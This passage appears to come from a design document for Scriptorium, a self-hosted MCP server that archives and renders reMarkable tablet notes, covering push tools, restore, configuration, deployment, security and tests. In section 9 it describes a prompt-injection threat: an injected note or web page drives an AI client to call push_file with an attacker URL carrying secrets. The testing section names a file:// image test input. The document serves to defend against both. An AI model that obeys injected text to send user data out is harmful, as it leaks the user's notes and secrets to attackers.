- Layers are composited in order; highlighter uses multiply blending; annotated PDFs are composited over the pypdfium2-rendered page placed at 226/72 units per point; extended-height and zoomed-out pages render at their full extent. Golden PNGs for the S3 fixture live in `tests/fixtures/move-test-notebook/golden/`.

---

## 9. Push to the tablet

All conversion happens in the worker; clients send text or a URL. This is what makes pushes work from claude.ai mobile.

| Tool | Input | Conversion | Lands as |
| --- | --- | --- | --- |
| `push_markdown(title, folder, markdown)` | Markdown text (≤ `MAX_INLINE_KB`, default 256) | markdown-it (**`html=False`**) → HTML → PDF (WeasyPrint in a sandboxed subprocess) at the device page size | Annotatable PDF |
| `push_file(title, folder, kind, url \| data_base64)` | `pdf`, `epub` | Pass-through | Document |
| `push_ink(title, folder, kind, url \| data_base64)` | `png`, `jpg`, `svg`, `pdf` | `scriptorium-ink` sidecar (rmink, AGPL, optional; §4.4) → `.rm` v6 strokes in a `.rmdoc` (Move geometry) | Native notebook; strokes are erasable and extendable. Hidden when the sidecar is not configured |

**Inline data is small by nature.** A Claude client produces tool arguments as output tokens, so a few hundred KB is the realistic ceiling, and claude.ai cannot hand a chat attachment's bytes to a tool. `MAX_INLINE_KB` therefore defaults to 256; anything larger comes by `url`. In practice "push from a phone" means Markdown or a URL, and the documentation says so.

**Markdown → PDF sandbox.** Raw HTML disabled; WeasyPrint runs with a custom `url_fetcher` that permits only `data:` URIs (no `file:`, no `http(s):`), fonts bundled in the image (DejaVu + Noto Sans CJK; `XDG_CACHE_HOME=/tmp/fontconfig` for the read-only rootfs), in a subprocess with a 30 s CPU limit, 512 MB RSS limit and no network namespace where the runtime permits.

**URL fetches** (`push/fetch.py`): HTTPS only; hostname resolved **once**, every resolved address must satisfy `ipaddress.is_global` (which excludes loopback, RFC 1918, link-local, CGNAT `100.64/10`, IPv4-mapped and ULA), and the connection is pinned to that address; redirects are followed at most 3 times and each hop is re-validated; streamed with a byte cap (`MAX_FETCH_MB`, default 50) and 30 s timeout; content-type checked against `kind`. Because an injected note or web page could drive `push_file(url="https://attacker/?q=<secrets>")`, fetches are additionally gated by `PUSH_URL_ALLOWLIST` (comma-separated host suffixes; when empty, the tool asks for confirmation via a confirmation token that includes the host, §11.0) and the host is written to the audit log. Images pass `PIL.Image.MAX_IMAGE_PIXELS`; PDFs are size- and page-count-checked before pypdfium2 or the sidecar sees them.

Upload path: PDF/EPUB upload is upstream's known-good blob path (`.content`/`.metadata`/`.pagedata`/`.pdf` blobs + document index + generation-gated root commit). Native notebooks use the same mechanism with `.rm` blobs; the unknown is which `.content` fields the Move requires — **S1**. Until S1 passes, `push_ink` is disabled and `push_markdown` always produces PDF. Pushed documents appear on the tablet at its next sync and are then archived by the worker like any other document.

---

## 10. Backup and restore

### 10.1 Backup

- The archive is the backup: xochitl layout, original UUIDs, retained blobs, tombstones instead of deletes.
- Point-in-time snapshots are a **host** responsibility; a container cannot run `zfs`/`btrfs` and should not be privileged. Strategies (`SNAPSHOT_STRATEGY`):
  - `host` — the operator schedules `zfs snapshot` / `btrfs subvolume snapshot` of the `/data` dataset on the Docker host (cron/systemd timer; example scripts in `docker/host-snapshots/`) and mounts the snapshot directory read-only at `/data/snapshots`. Scriptorium only *lists and reads* snapshots by naming convention (`scriptorium-YYYYMMDDTHHMMZ`); `admin_snapshot_now` is unavailable.
  - `restic` — the worker runs `restic backup` from inside the container to `RESTIC_REPO` (password from a Docker secret, independent of the master key). SQLite files are copied with `VACUUM INTO` first so the backup is consistent. `admin_snapshot_now` triggers a run.
  - `none` — `snapshots()` reports "external".
- Retention (restic): 7 daily, 4 weekly, 6 monthly (configurable). Host strategies keep their own retention.
- **The master key is never under `/data`** and therefore never in a snapshot; a leaked backup exposes no device tokens.

### 10.2 Restore

`restore(scope, from, mode, confirmation_token=null)`:

- `scope`: whole library, a folder UUID, or a list of document UUIDs.
- `from`: `archive` (current view plus tombstones), `snapshot:<id>` (an id from `snapshots()`; never a free-form string), or `version:<uuid>@<generation>`.
- `mode`: `missing` (default: only UUIDs the cloud does not have), `overwrite` (replace cloud copies). `overwrite` and whole-library restores require a confirmation token from a dry run (§11.0).

Algorithm (worker job, resumable): read the cloud root → compute the set → push `CollectionType` records first (parents before children) → push documents in batches, recording per-UUID progress → verify by re-reading the root. Each batch is one generation-gated upsert, so a crash mid-way resumes without duplicates. `restore_status(job)` reports progress. Depends on **S1**.

What restore cannot bring back: device settings, Wi-Fi, templates, splash screens (not in the document store). On the free tier, documents idle > 50 days are only on the tablet and in the archive — the archive is the sole complete copy after a factory reset, which is why §7 never deletes.

---

## 11. MCP tool surface

### 11.0 Conventions (binding for every tool)

- **User context** comes from the bearer token; no tool accepts a user id or a filesystem path. `tools/list` is filtered per request (admin tools, `push_ink`).
- **Document identifiers**: a UUID, or a `/`-separated path of visible names from the root (`Notes/Projects/2026-10`). Ambiguous paths return `ambiguous` with the candidate UUIDs. Folders likewise. Cloud-supplied names are display data only; filesystem names are always UUIDs (allowlist `^[0-9a-f-]{36}(\.(metadata|content|pagedata|pdf|epub))?$`), and every resolved path is asserted to stay inside the account root.
- **Pages** are 1-based in every tool.
- **Pagination**: list-like tools take `limit` (≤ 100, default 50) and `cursor`, and return `next_cursor`. Text results are capped at 64 KB; `read_document` paginates by page range.
- **Timestamps** are ISO 8601 UTC in and out.
- **Errors** are MCP tool errors (`isError: true`) with `{code, message, hint}`; codes: `not_linked`, `needs_relink`, `not_found`, `ambiguous`, `stale_hash`, `quota_exceeded`, `ocr_cap_reached`, `pending`, `refused`, `confirm_required`, `sync_anomaly`, `invalid_argument`.
- **Long operations** return `{job, state}`; `read_page` on a cache miss waits up to 20 s then returns `pending` with the job id.
- **Destructive actions** (`restore(overwrite)`, `forget_me`, `admin_delete_user`, `admin_purge_tombstones`, `admin_gc_blobs`, `disconnect_remarkable(keep_archive=false)`) are two-step: the first call without a token performs a **dry run** and returns `{confirmation_token, summary}` (valid 10 min, bound to the user and the exact arguments); the second call with the token executes. Tools carry `readOnlyHint` / `destructiveHint` / `idempotentHint` annotations.
- **Files** (`export`, `read_document(format="pdf")`) return a **short-lived signed download URL** `https://mcp.example.com/dl/<token>` (random 256-bit token, 10 min, single user) alongside an MCP resource link, because claude.ai gives the user no way to save a base64 blob. `/dl/*` is the one path that must be reachable from users' browsers (§13).
- **Audit**: every call logs user, tool, duration, outcome and non-content identifiers (§6.2); retention `AUDIT_RETENTION_DAYS` (default 365).

### 11.1 Account

| Tool | Purpose |
| --- | --- |
| `connect_remarkable(code, replace=false)` | Exchange a one-time code from https://my.remarkable.com/device/browser/connect for a device token; store encrypted; start polling. Refuses if that cloud account is linked to another user, or if this user already has an active account and `replace` is false. Each call registers a new device at reMarkable; the tool says so and points at the device list there. |
| `disconnect_remarkable(keep_archive=true, confirmation_token=null)` | Stop polling and delete the device token locally. Scriptorium cannot revoke it at reMarkable; the response tells the user to remove the device at my.remarkable.com. |
| `account_status()` | Link state, last successful sync, document/page counts, OCR mode and spend, quota usage, pending jobs, warnings (`needs_relink`, `anomaly`, render failures). |
| `set_claude_api_key(key, monthly_cap_usd=null)` / `clear_claude_api_key()` | Per-user OCR key (encrypted). |
| `set_auto_ocr(folders: [id], enabled)` | Folders to transcribe automatically. |
| `create_token(name, ttl_days)` / `revoke_token(id)` / `list_tokens()` | Personal access tokens (§5.4). |
| `forget_me(confirmation_token=null)` | Delete all of the user's data, secrets, jobs, PATs, link-registry rows and audit identifiers. Host snapshots and restic age out by retention (stated in the dry-run summary). The AS account is not touched. |

### 11.2 Library

| Tool | Purpose |
| --- | --- |
| `list(folder=null, include_trash=false, include_deleted=false, account=null, cursor, limit)` | Children of a folder (root by default): name, type, uuid, modified, page count, state. |
| `recent(since, limit, cursor)` | Documents/pages changed since a timestamp. |
| `search(query, folder=null, limit, cursor)` | FTS over transcripts, names and paths; returns page refs with snippets. |
| `read_page(document, page)` | Transcript (triggers OCR per mode on cache miss; in lazy mode returns the image and asks the client to transcribe). |
| `read_document(document, format="markdown" \| "pdf", pages=null)` | Whole document: sectioned Markdown of transcripts (paginated), or a rendered PDF via signed download URL. |
| `page_image(document, page, scale=1)` | PNG of the page for Claude to look at. |
| `versions(document)` / `read_page(document, page, version=<generation>)` | Version history (§6). |
| `link_page(document, page, kind, ref)` / `links(document, page)` | Store or list external references (opaque strings ≤ 1 KB). |

### 11.3 OCR

| Tool | Purpose |
| --- | --- |
| `transcribe(document, pages=[], force=false)` | Enqueue OCR (user/server mode) or return images (lazy mode). |
| `save_transcript(document, page, content_hash, text, model)` | Lazy-mode write-back; `stale_hash` if the page changed. |
| `ocr_status()` | Queue depth, last errors, spend this month against each applicable cap. |

### 11.4 Push

`push_markdown`, `push_file`, `push_ink` as in §9; `push_status(job)`.

### 11.5 Backup and restore

| Tool | Purpose |
| --- | --- |
| `snapshots()` | Available snapshots (ids, dates, sizes) or "external". |
| `trash(limit, cursor)` | Trashed and tombstoned documents with `deletion_cause`. |
| `restore(scope, from, mode, confirmation_token=null)` / `restore_status(job)` | §10.2. |
| `export(document, format="rmdoc" \| "pdf", version=null)` | Signed download URL for a `.rmdoc` or PDF. |

### 11.6 Admin (role-gated; never via PAT)

| Tool | Purpose |
| --- | --- |
| `admin_status()` | Versions, uptime, worker heartbeat, disk usage, cloud error rates, anomalies, snapshot strategy state, licence-check result. |
| `admin_users()` | Users, link state (including which user holds a given reMarkable account), storage used, last sync, OCR mode (never keys). |
| `admin_set_quota(user, gb)` / `admin_disable_user(user)` / `admin_delete_user(user, confirmation_token=null)` | Operator controls. Disabling revokes PATs and stops polling. |
| `admin_allow_server_key(user, allowed)` | Grant/revoke use of the server-wide Claude key. |
| `admin_transfer_link(from_user, to_user)` | Move a reMarkable link and its archive when a user loses their AS identity. |
| `admin_clear_anomaly(user, reason)` | Resume deletes/sync after a mass-delete or protocol anomaly, after a human check. |
| `admin_purge_tombstones(user, older_than_days, confirmation_token=null)` / `admin_gc_blobs(user, confirmation_token=null)` | The only ways data leaves `/data`. Dry run first. |
| `admin_snapshot_now()` | restic strategy only. |
| `admin_audit(user=null, since, limit, cursor)` | Audit log. |

Server-wide settings are environment only (§12); there is intentionally no tool that mutates them.

---

## 12. Configuration

Environment variables, all prefixed `SCRIPTORIUM_`. Secrets may be given as `*_FILE` paths for Docker secrets.

| Variable | Default | Notes |
| --- | --- | --- |
| `PUBLIC_URL` | — | `https://mcp.example.com/mcp`, byte-exact; used as OAuth `resource` and default audience |
| `BIND` | `0.0.0.0:8000` | MCP + well-known + `/dl`; behind the reverse proxy only |
| `TRUSTED_PROXIES` | Docker bridge ranges | Addresses whose `X-Forwarded-For`/`-Proto` are believed (needed for rate limits and `/dl` logging when the proxy is on another machine) |
| `METRICS_BIND` | `0.0.0.0:9100` | Prometheus; **not** published through the proxy |
| `DATA_DIR` | `/data` | Must be a local POSIX filesystem |
| `MASTER_KEYS` | — | One or more urlsafe-base64 32-byte keys, comma-separated, newest first (MultiFernet; rotate by prepending and re-encrypting with `scriptorium admin rotate-keys`). Generate with `scriptorium gen-master-key`. Keep an escrow copy outside `/data`. Losing every key means every user relinks. |
| `OIDC_*` | — | §5.2; `OIDC_ALLOWED_USERS` required |
| `ALLOW_ALL_ISSUER_USERS` | `false` | Explicit opt-out of the allowlist |
| `POLL_SECONDS` | `600` | |
| `SYNC_CONCURRENCY` / `SYNC_WORKERS` / `RENDER_WORKERS` | `2` / `4` / `2` | |
| `TOMBSTONE_MAX_PER_POLL` | `50` | Circuit breaker (§7) |
| `BLOB_RETENTION_DAYS` | `365` | Eligibility for manual GC only |
| `ANTHROPIC_API_KEY` | unset | Server-wide OCR key (§8) |
| `SERVER_KEY_USERS` | **empty** | Comma-separated user ids/emails allowed to use it (`*` is accepted but discouraged) |
| `OCR_MODEL` | `claude-sonnet-5-5` | |
| `OCR_MONTHLY_CAP_USD` / `OCR_USER_MONTHLY_CAP_USD` | `20` / `10` | Global and per-user caps on server-key spend, all call types |
| `OCR_PRICE_IN_PER_MTOK` / `OCR_PRICE_OUT_PER_MTOK` | list price of `OCR_MODEL` | For cost accounting |
| `MAX_INLINE_KB` / `MAX_FETCH_MB` | `256` / `50` | §9 |
| `PUSH_URL_ALLOWLIST` | empty | Host suffixes; empty = confirmation required per fetch |
| `INK_SIDECAR_URL` | unset | e.g. `http://scriptorium-ink:9000`; `push_ink` is hidden when unset |
| `DEFAULT_QUOTA_GB` | `20` | Per user |
| `SNAPSHOT_STRATEGY` | `none` | `host` / `restic` / `none` |
| `RESTIC_REPO`, `RESTIC_PASSWORD_FILE` | — | |
| `AUDIT_RETENTION_DAYS` | `365` | |
| `LOG_LEVEL` | `info` | Logs never include note content, tokens or tool arguments |

---

## 13. Deployment

`docker/compose.example.yml` (abridged):

```yaml
services:
  scriptorium:
    image: ghcr.io/milkyengineer/scriptorium:1
    command: serve
    env_file: scriptorium.env
    secrets: [scriptorium_master_keys]
    volumes: ["/srv/scriptorium/data:/data"]          # local filesystem; add ":/data/snapshots:ro" mount for the host strategy
    networks: [proxy, internal]
    read_only: true
    tmpfs: ["/tmp"]
  scriptorium-worker:
    image: ghcr.io/milkyengineer/scriptorium:1
    command: worker
    env_file: scriptorium.env
    secrets: [scriptorium_master_keys]
    volumes: ["/srv/scriptorium/data:/data"]
    networks: [internal]
    read_only: true
    tmpfs: ["/tmp"]
  # ---- optional: only if you have no OIDC issuer.  `docker compose --profile keycloak up` ----
  keycloak:
    profiles: [keycloak]
    image: quay.io/keycloak/keycloak:26.4.0          # pin the exact version S2 verified
    command: start --import-realm --hostname https://auth.example.com --hostname-admin https://keycloak-admin.internal --http-enabled true --proxy-headers xforwarded
    environment: { KC_DB: postgres, ... }
    volumes: ["./keycloak:/opt/keycloak/data/import:ro"]
    networks: [proxy, internal]
  keycloak-db:
    profiles: [keycloak]
    image: postgres:16
    networks: [internal]
  # ---- optional: AGPL ink sidecar (§4.4); enables push_ink.  `--profile ink` ----
  scriptorium-ink:
    profiles: [ink]
    image: ghcr.io/milkyengineer/scriptorium-ink:1
    networks: [internal]
secrets:
  scriptorium_master_keys: { file: ./secrets/master_keys }   # outside /data; back up separately
```

The default `docker compose up` starts only `scriptorium` and `scriptorium-worker`; `scriptorium.env` points `SCRIPTORIUM_OIDC_ISSUER` at whatever issuer the operator already runs. The `keycloak` profile is a convenience for operators who have none; the `auth.example.com` rows in the proxy table below apply only to it (an existing issuer has its own exposure rules).

**Reverse proxy** (any of Caddy, Traefik, nginx; TLS via ACME; examples in `docker/proxy/`). It may run on the Docker host or on another machine on the operator's network; in the latter case the `scriptorium` and `keycloak` services publish their ports on an interface reachable only by the proxy, and `X-Forwarded-*` headers are trusted from that address alone (`TRUSTED_PROXIES`). The bearer token is the primary access control on `/mcp`; IP allowlisting is defence in depth and is **optional**, because Claude Code and the signed downloads need user-side access. Per-path rules:

| Host / path | Reachable from | Notes |
| --- | --- | --- |
| `mcp.example.com/mcp`, `/.well-known/*` | Anthropic egress `160.79.104.0/21`, plus users' networks (or a Tailscale/VPN range) if Claude Code is used; or everyone, relying on bearer auth + rate limits | |
| `mcp.example.com/dl/*` | users' browsers | Unguessable 10-min tokens; rate-limited |
| `mcp.example.com/healthz` | proxy / monitoring only | |
| `auth.example.com/realms/scriptorium/{protocol/openid-connect/*, login-actions/*, broker/*/endpoint, .well-known/*}`, `/resources/*` | Anthropic egress (token, discovery), users' browsers (login), Claude Code (everything) — in practice: everyone, rate-limited | |
| `auth.example.com/realms/scriptorium/clients-registrations/*` | deny (pre-registered clients) or operator IPs | |
| `auth.example.com/admin/*`, `/realms/master/*` | **deny** | Admin console only via the internal hostname |
| `:9100/metrics` | not published | |

- **Cloudflare Tunnel** is an alternative that avoids port-forwarding but terminates TLS at Cloudflare; the direct route is preferred because note content then only transits Anthropic ↔ your host.
- **Health:** `GET /healthz` (server) and a worker heartbeat row in SQLite; the container health check uses both.
- **Backups of the backup:** host-level backup of `/srv/scriptorium` (data, the Keycloak DB if the profile is used, `secrets/` kept separately) or the restic strategy to an off-site repo.
- **Image:** `python:3.12-slim` base, `uv` sync, apt `libpango-1.0-0 libpangoft2-1.0-0 libharfbuzz-subset0 fonts-dejavu-core fonts-noto-cjk` for WeasyPrint (≈ +100 MB), non-root user (`PUID`/`PGID` build args or `user:` in compose), read-only root filesystem, `/data` and `/tmp` writable, multi-arch (amd64, arm64 — resvg-py and pypdfium2 ship aarch64 wheels). Published to `ghcr.io/milkyengineer/scriptorium`, tagged by semver; `1` tracks the latest 1.x.
- **CI:** GitHub Actions — ruff, mypy, pytest with cassettes, image build, SBOM, licence gate, push on tag.

Going fully cloud-free (self-hosting the reMarkable cloud with `rmfakecloud`) is out of scope: it requires developer mode on the Paper Pro Move and breaks on every firmware update.

---

## 14. Security

- **Trust model:** the operator can read every user's notes on disk; users must trust the operator. Documented for users in the README.
- **Isolation:** every path is built from the token's `(iss, sub)`; no tool accepts a user id or a path. Document/page identifiers are UUIDs; cloud-supplied filenames pass an allowlist regex; `.rmdoc` zips are extracted with per-entry path checks (no zip-slip); resolved paths are asserted inside the account root.
- **Secrets:** device tokens and user API keys are encrypted at rest (MultiFernet, keys from a Docker secret outside `/data`) and are never returned by any tool, including admin tools. Restic password independent of the master keys.
- **Tokens:** JWT validation with pinned algorithms, cached JWKS with refetch cooldown, strict `iss`/`aud`-membership/`exp`/`nbf`, clock skew 60 s; PATs stored as SHA-256, `scr_` prefix, ≤ 90 d, no admin.
- **Shell:** Scriptorium never passes user- or cloud-derived strings to a shell. Snapshot ids are matched against the server-enumerated list before use; restic is invoked with an argument list, not a command string.
- **Transport:** TLS at the proxy; HSTS; the container is reachable only on the internal Docker network.
- **Rate limits:** per user per minute on tool calls, on push bytes and on URL fetches; global on cloud calls; on `/dl/*` and the 401 path.
- **SSRF and exfiltration:** §9 (`push/fetch.py`): HTTPS, resolve-once + pinned connect, `is_global` on every address, redirect re-validation, byte cap, host allowlist or per-fetch confirmation, host in the audit log.
- **Content sandboxes:** Markdown→PDF with HTML disabled and a deny-all fetcher in a resource-limited subprocess; image and PDF bombs rejected by size before decoding.
- **Audit:** every tool call logged with user, tool, duration, outcome and non-content identifiers; never arguments, content or secrets.
- **Data policy note:** the one-time connect code and all note transcripts pass through the user's Claude conversation; `forget_me` cannot reach into host snapshots or restic history, which age out by retention. Both are stated to users.
- **Supply chain:** pinned `uv.lock`, image built in CI with SBOM and licence gate, Dependabot on the fork.

---

## 15. Observability

- Structured JSON logs (`LOG_LEVEL`), fields: `ts, level, event, uid (hashed), acct, job, duration_ms, outcome`; no content.
- Prometheus metrics on `METRICS_BIND` (internal only): `scriptorium_sync_duration_seconds{acct}`, `scriptorium_documents_total`, `scriptorium_pages_rendered_total`, `scriptorium_render_failures_total`, `scriptorium_ocr_pages_total{mode}`, `scriptorium_ocr_cost_usd_total{mode}`, `scriptorium_cloud_http_total{status}`, `scriptorium_jobs{state}`, `scriptorium_anomalies{kind}`.
- `account_status` / `admin_status` expose the same numbers through MCP so no dashboard is needed to know the system is healthy.

---

## 16. Testing

- **Unit:** layout helpers and filename allowlist, index and history, job queue (lease expiry, dedupe, backoff), tombstone circuit breaker, OCR cache and caps, settings parsing, JWT validation (test keys, `aud` array, wrong `iss`), SSRF guard (every private range, redirects, rebinding), Markdown sandbox (`<img src=file://…>` must not render), confirmation tokens.
- **Fixtures:** a **dedicated test notebook** written for the purpose (colour pens, highlighter, typed text, an annotated PDF) exported from a Paper Pro Move, with golden PNGs; a sample `.rmdoc`. No real notes in the repo.
- **Cloud contract tests:** recorded HTTP cassettes for root/list/download/upload against the real sync 1.5 API, **scrubbed of tokens and content** before commit, re-recorded on protocol changes; a live smoke test against a scratch account, run manually.
- **Auth integration:** compose profile with the Keycloak realm import; a test client performs PKCE + token (and refresh, concurrent refresh) and calls `/mcp`; a Claude Code run from outside any allowlist.
- **End to end:** Claude Code `claude mcp add` against a local stack, scripted tool calls; a manual checklist from claude.ai mobile (images, download links, push).
- **Licence gate:** `pip-licenses` over the built image in CI; fails on GPL/AGPL.

---

## 17. Roadmap

Details, procedures and acceptance criteria live in `docs/Plan/`. Summary:

### Spikes (results in `docs/Spikes/<id>.md`)

| ID | Question | Pass criterion | Gates |
| --- | --- | --- | --- |
| **S0** | Is `remarkable-mcp` usable as a per-user library without AGPL deps? | Installs with neither `pymupdf` nor `ebooklib`; two clients with different tokens and cache dirs in one process, no env reads at call time; upload with a caller-supplied UUID; a stable reMarkable account identity is extractable from the device token (or documented as unavailable). Else: vendoring plan written. **Result: passed, fork tag `scriptorium-s0`, identity claim `auth0-userid`** | M1 |
| **S1** | Can we upload a native notebook through the cloud API, including under a reused UUID? | An archived notebook re-uploaded under a new UUID opens on the Move; edits round-trip; re-upload under its **original** UUID after deletion restores it; running the job twice creates no duplicate; a generation conflict is retried correctly | M3 (push), M4 (restore) **Result: passed; restore under original UUIDs confirmed on the tablet (`docs/Spikes/S1.md`)** |
| **S2** | Does Keycloak + Claude's OAuth client work end to end with pre-registered clients? | claude.ai (web + mobile) and Claude Code complete login; admin role present in the token; refresh after expiry and after 24 h idle; two concurrent refreshes; Claude Code from a network outside any allowlist; DCR and CIMD compared and documented; exact Keycloak version and realm JSON committed | M1 |
| **S3** | Do Paper Pro Move `.rm` files render correctly with rmscene? | The dedicated test notebook (≥ 20 pages, colour, highlighter, typed text, annotated PDF) renders without errors and matches reference photos; panel geometry confirmed **Result: passed; geometry, colours and extents recorded in `docs/Spikes/S3.md`; fork tag `scriptorium-s3`** | M1 |
| **S4** | How does the cloud behave on a free account, and what does the 50-day cut-off look like? | On a free account: list/download/upload work (or are documented as Connect-only); an aged document's state is observed (absent from root / blobs 404 / flagged) and the tombstone `deletion_cause` heuristic is specified from the evidence | M1 |
| **S5** | Two containers + SQLite WAL on the operator's `/data` filesystem; host snapshot feasibility | 24 h soak of server + worker with concurrent reads/writes, no `SQLITE_BUSY` escalations or corruption; `statfs` refusal verified on a FUSE mount; a host snapshot is listed and readable from the container | M1 |
| **S6** | What do Claude clients actually render from this server? | Image blocks on claude.ai mobile; resource links vs signed URLs; max practical tool-argument size; `tools/list` filtering per user — all measured and written down | M1 |

### Milestones

| # | Name | Contents | Acceptance (abridged; full list in `docs/Plan/02-milestones.md`) |
| --- | --- | --- | --- |
| **M1** | Safe archive, single user | Auth with pre-registered clients and default-deny users; archive with staged atomic commits, version history, tombstones that never auto-purge, circuit breaker, safe mode; render; `list/recent/read_page/read_document(markdown)/page_image/versions/trash`; lazy OCR; audit basics; cassettes; licence gate | Sync lag < 15 min; a cloud-side deletion produces a tombstone and no file deletion; a partial listing produces no tombstones; a mass delete halts; restart mid-download leaves no partial document; p95 tool latency < 2 s on cached data; end-to-end run from claude.ai mobile and Claude Code; CI green including licence gate |
| **M2** | OCR modes and search | User/server keys, auto-OCR with debounce and Batches, caps, FTS `search`, cost accounting | A page is transcribed once per version; caps degrade to lazy; spend in `ocr_status` within 5 % of the API console |
| **M3** | Push | `push_markdown` (sandboxed PDF), `push_file(url)` with SSRF guard and allowlist/confirmation, rate limits; `push_ink` via sidecar when S1 passes | Sandbox tests pass (`file://`, internal hosts refused); a pushed PDF opens on the tablet; a retried push creates no duplicate |
| **M4** | Backup and restore | `snapshots` (host/restic), `restore` (resumable, dry-run token), `export` via signed URL | A wiped scratch tablet is rebuilt, folders included, with no duplicates, and a second run is a no-op |
| **M5** | Multi-user and admin | Quotas, admin tools, transfer link, anomaly clearing, PATs, operator docs | Two users with separate reMarkable accounts, isolation tests, PAT without admin |
| **M6** | Hardening and 1.0 | Metrics, multi-arch image, restic consistency, documentation, threat-model review | Release checklist in the plan |

---

## 18. Open questions

1. Does the reMarkable cloud rate-limit or flag an always-on client that polls every 10 minutes? (S4/S5 soak observes it; the fallback is a longer interval.)
2. Which `.content` fields does the Move require for a notebook it will open (template, orientation, `fileType`, page geometry)? (S1)
3. ~~Is there a stable account identity in the device token for the one-account rule? (S0)~~ Yes: `auth0-userid`, see `docs/Spikes/S0.md`.
4. Whether typed-text native notebooks from Markdown are good enough for a later `push_markdown(as="notebook")`.
5. Policy: before notes belonging to an organisation are synced to a personal, internet-reachable server, confirm that the organisation's data policy permits it. Scriptorium cannot enforce this; the operator documentation must state it.
6. Native, clean-room MIT image-to-ink converter on rmscene, so the AGPL `scriptorium-ink` sidecar can be retired.
7. Whether an IP allowlist on `/mcp` is worth keeping once Claude Code users are in the picture, or whether bearer auth + rate limits + fail2ban-style lockout is the simpler and equally safe posture.

---

## 19. References

- remarkable-mcp (MIT): https://github.com/sammorrowdrums/remarkable-mcp
- rmscene (MIT): https://github.com/ricklupton/rmscene
- rmink (AGPL-3.0-or-later; sidecar only, never in context when writing the native converter): https://pypi.org/project/rmink/
- resvg-py (MIT): https://github.com/baseplate-admin/resvg-py · pypdfium2 (BSD-3/Apache-2.0): https://pypi.org/project/pypdfium2/ · WeasyPrint (BSD-3): https://pypi.org/project/weasyprint/
- ddvk/rmapi (cloud protocol reference): https://pkg.go.dev/github.com/ddvk/rmapi
- rmfakecloud (self-hosted cloud, out of scope): https://github.com/ddvk/rmfakecloud
- Claude connector authentication requirements: https://claude.com/docs/connectors/building/authentication
- Claude Code MCP configuration: https://code.claude.com/docs/en/mcp
- Keycloak: client registration policies, `--import-realm`, MCP guide: https://www.keycloak.org/documentation
- RFC 9728 (protected resource metadata), RFC 8414 (AS metadata), RFC 7591 (DCR), RFC 7636 (PKCE)
- reMarkable device connect page: https://my.remarkable.com/device/browser/connect
- reMarkable Connect / free tier sync limit: https://blog.remarkable.com/shop/connect/pricing
